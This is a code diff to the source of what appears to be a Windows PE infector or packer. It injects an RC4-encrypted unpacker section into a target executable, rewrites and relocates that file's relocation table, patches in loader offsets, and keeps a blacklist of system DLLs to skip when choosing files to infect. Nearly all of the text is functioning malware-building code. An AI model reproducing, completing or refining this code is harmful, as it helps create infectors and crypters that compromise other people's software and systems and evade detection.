@@ -161,6 +161,13 @@ DWORD Transfer_Reloc_Table(LPVOID hProcessModule, PIMAGE_NT_HEADERS32 pSelf, PIM
 				short type = ((*entry & 0xf000) >> 12);
 				long offset = (*entry & 0x0fff);
 
+				if (type == 0 && offset == 0)
+				{
+					entry++;
+					blocksize -= 2;
+					continue;
+				}
+
 				ULONG *ptr = (PULONG) destination->RawPointer(offset + newReloc->PageRVA);
 				ULONG value = *ptr;
 				ULONG dwNewValue = 0;
@@ -224,11 +231,17 @@ PIMAGE_SECTION_HEADER lookup_core_section(PIMAGE_DOS_HEADER pImageDosHeader, PIM
 	return pResult;
 }
 
-BOOL check_blacklist(PWIN32_FIND_DATA lpFindData)
+
+static BOOL check_blacklist(PWIN32_FIND_DATA lpFindData)
 {
-	char szToLower[MAX_PATH];
-	if (strcmpi(lpFindData->cFileName, "compobj.dll") == 0)
+	if (_strcmpi(lpFindData->cFileName, "compobj.dll") == 0)
 		return TRUE;
+
+	if (_strcmpi(lpFindData->cFileName, "avifile.dll") == 0)
+		return TRUE;
+
+	if (_strnicmp(lpFindData->cFileName, "nls", 3) == 0)
+		return TRUE;	// skip nls
 
 	return FALSE;
 }
@@ -476,13 +489,33 @@ int main32(int argc, char *argv[])
 	CPeSection *relocSection = pInfectMe->LookupSectionByName(".reloc");
 
 	size_t relocsize = relocSection->VirtualSize();
-		
+	
+	required_reloc_space = RoundUp(required_reloc_space, 16);
+
 	if (relocsize + required_reloc_space > relocSection->SizeOfRawData())
-	{	// expande
+	{	// expand
 		relocSection->AddSize(required_reloc_space);
 	}
+	
+	
+	PIMAGE_DATA_DIRECTORY DataDir = pInfectMe->DataDirectory();
+	
+	// move reloc table after
+	if (relocSection != NULL)
+	{
+		LPVOID lpSource = relocSection->RawData();
+		LPVOID lpDestination = CALC_OFFSET(LPVOID, lpSource, required_reloc_space);
 
+		LPVOID buffer = malloc(relocSection->SizeOfRawData());
+		memset(buffer, 0, relocSection->SizeOfRawData());
+		memcpy(CALC_OFFSET(LPVOID, buffer, required_reloc_space), lpSource, relocSection->SizeOfRawData() - required_reloc_space);
+		memcpy(relocSection->RawData(), buffer, relocSection->SizeOfRawData());
+		free(buffer);
 
+		DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress += required_reloc_space;
+	}
+
+	
 	char passKey[16];
 
 	for(int i =0; i < sizeof(passKey); i++)
@@ -490,8 +523,7 @@ int main32(int argc, char *argv[])
 
 	BYTE rc4sbox[256];
 	
-	PIMAGE_DATA_DIRECTORY DataDir = pInfectMe->DataDirectory();
-
+	
 	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pInfectMe->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 	
 	PIMAGE_SECTION_HEADER pDestSection = NULL;
@@ -500,7 +532,7 @@ int main32(int argc, char *argv[])
 	
 	CPeSection *pInfectSection = NULL;
 
-	int newVirtualSize = RoundUp(pUnpackerCode->Misc.VirtualSize + ((rand() % 16) * 1024), 1024);
+	int newVirtualSize = RoundUp(pUnpackerCode->Misc.VirtualSize, 1024);// + ((rand() % 16) * 1024), 1024);
 
 	if (pInfectMe->IsDLL())
 	{
@@ -510,10 +542,10 @@ int main32(int argc, char *argv[])
 	{
 		pInfectSection = pInfectMe->AddSection(szSectionName, 0x1000, newVirtualSize);	// move section in "head"
 
-		CPeSection *pMorphSection = morph->getSection(0);
+		//CPeSection *pMorphSection = morph->getSection(0);
 
-		memset(pInfectSection->RawData(), 0x90, newVirtualSize);
-		memcpy(pInfectSection->RawData(), pMorphSection->RawData(), (pMorphSection->SizeOfRawData() < newVirtualSize) ? pMorphSection->SizeOfRawData() : newVirtualSize);
+		//memset(pInfectSection->RawData(), 0x90, newVirtualSize);
+		//memcpy(pInfectSection->RawData(), pMorphSection->RawData(), (pMorphSection->SizeOfRawData() < newVirtualSize) ? pMorphSection->SizeOfRawData() : newVirtualSize);
 	}
 	
 	DWORD kernel32LoadLibraryA_Offset = 0;
@@ -702,10 +734,10 @@ int main32(int argc, char *argv[])
 	
 	int basesize  = 0;
 
-	if (maxoffset == 0)
+	if (maxoffset <= 0)
 		basesize = 0;
 	else
-		basesize = rand() % maxoffset;	// offset
+		basesize = (rand() % maxoffset) & 0xfffff000;	// offset
 
 	std::cout << "[CONFIG] Section Name: " << szSectionName << std::endl;
 	std::cout << "[CONFIG]         base: " << std::hex << basesize << std::endl;
@@ -871,6 +903,7 @@ int main32(int argc, char *argv[])
 
 	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key0, passKeyPtr[0]);
 	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &_rc4key1, passKeyPtr[1]);
+
 	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &dwRelocSize, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
 	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pUnpackerCode->SizeOfRawData, &lpRelocAddress, DataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	
@@ -890,11 +923,11 @@ int main32(int argc, char *argv[])
 	if (relocSection != NULL)
 	{	// there are a relocation
 		// space available into section!
-		dwOffset = RoundUp(relocSection->VirtualSize(), 0x10);
-		dwNewRelocOffset = relocSection->VirtualAddress() + dwOffset;
+		dwOffset = 0; // RoundUp(relocSection->VirtualSize(), 0x10);
+		dwNewRelocOffset = relocSection->VirtualAddress(); //+ dwOffset;
 		LPVOID lpWriteInto = CALC_OFFSET(LPVOID, relocSection->RawData(), dwOffset);
 		dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pUnpackerCode, lpWriteInto, pInfectSection->VirtualAddress() + basesize, pInfectMe, pInfectMe->NtHeader());
-		relocSection->GetSectionHeader()->Misc.VirtualSize = dwOffset + dwNewRelocSize;
+		//relocSection->GetSectionHeader()->Misc.VirtualSize = dwOffset + dwNewRelocSize;
 	}
 	else
 	{	// allocate new section inside ".text" section
@@ -907,6 +940,11 @@ int main32(int argc, char *argv[])
 	pInfectMe->NtHeader()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = dwNewRelocOffset;
 
 	//pInfectSection->
+
+	//SYSTEMTIME time;
+	//GetLocalTime(&time);
+
+	//pInfectMe->NtHeader()->FileHeader.TimeDateStamp = 0x51821d3c;
 
 	if (argc > 2)
 	{
